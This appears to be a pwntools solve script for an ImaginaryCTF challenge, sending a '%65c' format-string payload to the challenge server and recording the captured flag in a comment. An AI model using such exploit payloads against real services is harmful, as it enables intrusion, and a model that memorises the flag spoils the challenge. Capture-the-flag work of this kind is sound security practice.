from pwn import *

HOST = "bof.chal.imaginaryctf.org"
PORT = 1337
file = "./vuln"
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)

io.sendlineafter("buffer:", "%65c")
print(io.recvline())

io.interactive()
#ictf{form4t_strings_4re_c00l_051c94e1}
